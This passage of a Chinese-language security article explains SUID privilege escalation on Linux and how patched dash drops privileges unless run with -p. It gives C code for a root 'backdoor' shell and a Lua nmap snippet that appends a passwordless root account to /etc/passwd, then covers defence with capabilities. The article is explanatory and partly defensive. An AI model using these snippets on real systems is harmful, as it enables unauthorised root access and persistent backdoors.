我们知道，Linux的`system()`函数实际上是执行的`/bin/sh -c`，而CentOS的`/bin/sh`是指向了`/bin/bash`：
    [root@localhost tmp]# ls -al /bin/sh 
    lrwxrwxrwx. 1 root root 4 Apr 10  2017 /bin/sh -> bash
这就解释了为什么CentOS中suid程序执行id获得的结果仍然是www-data。假设我们此时将sh修改成dash，看看结果是什么：
    [root@localhost tmp]# su -s /bin/bash nobody
    bash-4.1$ ls -al /bin/sh 
    lrwxrwxrwx. 1 root root 9 Feb 19 00:21 /bin/sh -> /bin/dash
    bash-4.1$ ./suid id
    uid=99(nobody) gid=99(nobody) euid=0(root) egid=0(root) groups=0(root),99(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
dash并没有限制Effective UID，这里可以看到成功获取了root权限。
## Ubuntu的特殊处理
但是，我们来看看Ubuntu 16.04，其/bin/sh指向的同样是dash：
    $ ls -al /bin/sh
    lrwxrwxrwx 1 root root 4 9月  18  2016 /bin/sh -> dash
    $ ls -al /bin/dash 
    -rwxr-xr-x 1 root root 154072 2月  17  2016 /bin/dash
为什么仍然会出现无法提权的情况？
此时我们又需要了解另一个知识了。通常来说，类似Ubuntu这样的发行版都会对一些程序进行修改，比如我们平时在查看PHP版本的时候，经常会看到这样的banner：`PHP
7.0.33-0ubuntu0.16.04.11`，在官方的版本号后会带上Ubuntu的一些版本号，这是因为Ubuntu发行版在打包这些软件时会增加一些自己的代码。
那么我们可以来看看Ubuntu 16.04源中dash目录：
下载其中的`dash_0.5.8.orig.tar.gz`和`dash_0.5.8-2.1ubuntu2.diff.gz`并分别解压，我们可以看到dash
0.5.8的原始代码，和Ubuntu对其做的patch。
我们对原始代码进行patch后，会发现多了一个`setprivileged`函数：
    void setprivileged(int on)
    {
        static int is_privileged = 1;
        if (is_privileged == on)
            return;
        is_privileged = on;
        /*
         * To limit bogus system(3) or popen(3) calls in setuid binaries, require
         * -p flag to work in this situation.
         */
        if (!on && (uid != geteuid() || gid != getegid())) {
            setuid(uid);
            setgid(gid);
            /* PS1 might need to be changed accordingly. */
            choose_ps1();
        }
    }
`on`的取值取决于用户是否传入了`-p`参数， 而uid和gid就是当前进程的Real UID(GID)。可见，在on为false，且Real UID
不等于Effective UID的情况下，这里重新设置了进程的UID：
    setuid(uid)
setuid函数用于设置当前进程的Effective UID，如果当前进程是root权限或拥有`CAP_SETUID`权限，则Real UID和Saved
UID将被一起设置。
所以，可以看出，Ubuntu发行版官方对dash进行了修改：
**当dash以suid权限运行、且没有指定`-p`选项时，将会丢弃suid权限，恢复当前用户权限。**
这样以来，dash在suid的表现上就和bash相同了，这也就解释了为什么在Ubuntu
16.04以后，我们无法直接使用SUID+`system()`的方式来提权。
## 如何突破限制？
同样的，你下载Debian 10最新的dash，也可以看到类似代码。那么，为什么各大发行版分分在sh中增加了这个限制呢？
我们可以将其理解为是Linux针对suid提权方式的一种遏制。因为通常来说，很多命令注入漏洞都是发生在`system()`和`popen()`函数中的，而这些函数依赖于系统的/bin/sh。相比CentOS来说，Ubuntu和Debian中的sh一直都是dash，也就一直受到suid提权漏洞的影响。
一旦拥有suid的程序存在命令注入漏洞或其本身存在执行命令的功能，那么就有本地提权的风险，如果在sh中增加这个限制，提权的隐患就能被极大地遏制。
那么，如果我们就是要留一个具有suid的shell作为后门，我们应该怎么做？
将之前的`suid.c`做如下修改：
    int main(int argc, char* argv[]) {
        setuid(0);
        system(argv[1]);
    }
编译和执行，我们就可以发现，id命令输出的uid就是0了：
原因是我们将当前进程的Real UID也修改成了0，Real UID和Effective UID相等，在进入dash后就不会被降权了。
另一种方法，我们可以给dash或bash增加-p选项，让其不对shell降权。但这里要注意，我们不能再使用system函数了，因为`system()`内部执行的是`/bin/sh -c`，我们只能控制-c的参数值，无法给sh中增加-p选项。
这里我们可以使用`execl`或其他exec系列函数：
    int main(int argc, char* argv[]) {
        return execl("/bin/sh", "sh", "-p", "-c", argv[1], (char *)0);
    }
此时输出结果类似于Ubuntu 14.04里的结果，因为我给sh加了-p参数：
再回到我们最初的问题：那么具有suid权限的nmap在Ubuntu 18.04或类似系统中我们如何进行提权呢？
因为nmap
script中使用的是lua语言，而lua库中似乎没有直接启动进程的方式，都会依赖系统shell，所以我们可能并不能直接通过执行shell的方式来提权。但是因为此时nmap已经是root权限，我们可以通过修改`/etc/passwd`的方式来添加一个新的super
user：
    local file = io.open("/etc/passwd", "a")
    file:write("root2::0:0::/root:/bin/bash\n")
    file:close()
成功提权：
## 如何让系统变得更安全
作为一个系统的运维人员，我们如何来防御类似的suid提权攻击呢？
当然我们需要先感谢Linux内核和Ubuntu和Debian等发行版的开发人员，他们也在慢慢帮我们不断提高系统的安全性和稳定性，但类似于nmap这样功能强大的软件，我们无法奢求一律Secure
By Default，所以必须学习一些更有趣的知识。
Linux
2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在[capabilities(7)
- Linux manual page](http://man7.org/linux/man-pages/man7/capabilities.7.html)中看到这些特权的说明。
类似于ping和nmap这样的程序，他们其实只需要网络相关的特权即可。所以，如果你在Kali下查看ping命令的capabilities，你会看到一个`cap_net_raw`：
    $ ls -al /bin/ping
    -rwxr-xr-x 1 root root 73496 Oct  5 22:34 /bin/ping
    $ getcap /bin/ping
    /bin/ping = cap_net_raw+ep
这就是为什么kali的ping命令无需设置setuid权限，却仍然可以以普通用户身份运行的原因。
同样，我们也可以给nmap增加类似的capabilities：
    sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap
    nmap --privileged -sS 192.168.1.1
再次使用TCP SYN扫描时就不会出现权限错误的情况了：